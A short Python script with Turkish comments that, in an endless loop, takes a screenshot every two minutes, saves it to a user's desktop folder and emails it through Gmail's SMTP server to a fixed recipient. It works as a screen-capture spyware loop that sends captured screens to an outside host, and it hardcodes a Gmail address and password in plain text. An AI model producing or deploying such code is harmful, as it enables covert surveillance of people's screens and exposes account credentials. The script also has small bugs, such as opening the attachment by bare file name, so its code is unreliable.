import os #ad
import pyautogui #ss
import time #ad
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import sys
from email import encoders


while True:
    ekran_goruntusu = pyautogui.screenshot()  # pyautogui ile ekran görüntüsünü al
    dosya_adi = str(time.time_ns()) + ".jpg" #Şu anki zamanı kullanıyoruz böylece isim hiçbir zaman aynı olmuyor

    dosya_yolu = os.path.join(r"C:\\Users\Nesrin\Desktop\Kodlama", dosya_adi) # ekran görüntüsünün kaydedileceği yol

    ekran_goruntusu.save(dosya_yolu) # ekran görüntüsünü save() fonksiyonu ile kaydediyoruz

    mail = smtplib.SMTP("smtp.gmail.com",587)          
    mail.ehlo()
    mail.starttls()
    # gmail kullanıcı adımı ve şifremi giriyorum.
    mail.login("teknowriter.74@gmail.com", "NtAx474_x") 
    mesaj = MIMEMultipart()

    mesaj["From"] = "teknowriter.74@gmail.com"        # Gönderen kişi
    mesaj["To"] = "nesrin.atikturk@gmail.com"         # Alıcı

    mesaj["Subject"] = "Ekran görüntüleri"  # Konu

    body = """

        Ekran görüntüsü gönderiyorum.

    """
    mesaj.attach(MIMEText(body, 'plain'))
    attach_file_name = dosya_adi
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) 
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    mesaj.attach(payload)

    mail.sendmail( mesaj["From"], mesaj["To"], mesaj.as_string())
    print("Mail başarılı bir şekilde gönderildi.")
    mail.close()
    time.sleep(120)